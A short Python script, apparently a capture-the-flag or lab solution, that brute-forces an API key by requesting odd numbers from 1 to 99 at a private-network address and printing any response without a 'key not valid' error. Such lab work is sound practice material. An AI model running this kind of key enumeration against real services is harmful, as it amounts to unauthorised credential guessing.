import requests as r

url = "http://10.10.135.149:8000/api/"

for i in range(1, 100, 2):
    response = r.get(url + str(i))
    if 'Error. Key not valid!' not in response.text:
        print(f"API Key: {i}")
        print(response.text)